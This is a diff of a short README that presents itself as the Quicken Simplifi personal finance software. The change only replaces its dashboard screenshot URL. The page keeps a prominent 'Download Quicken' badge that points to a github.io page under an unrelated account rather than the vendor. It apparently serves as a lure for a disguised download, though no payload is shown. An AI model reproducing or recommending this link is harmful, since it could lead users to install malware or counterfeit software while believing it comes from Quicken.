@@ -1,6 +1,6 @@
 # Quicken Simplifi - Personal Finance Software for Budgeting, Bills, and Account Tracking
 
-![Quicken dashboard with budgets, accounts, spending charts, and bill reminders](https://avatars.mds.yandex.net/i?id=ff979c464371c0c1358f187072fd956d_l-5679285-images-thumbs&n=13)
+![Quicken dashboard with budgets, accounts, spending charts, and bill reminders](https://play-lh.googleusercontent.com/mmcO5ZA7NM03-jO1gmh-Vt5-go13m1RpY7j49d5YvS8zpv_z2-yTVRd5_HcnOPatIA=h500)
 
 [![Download Quicken](https://img.shields.io/badge/Download-Quicken-blueviolet?style=for-the-badge&logo=windows)](https://hankhartmanfphp.github.io/.github/quicken-simplifi)
 
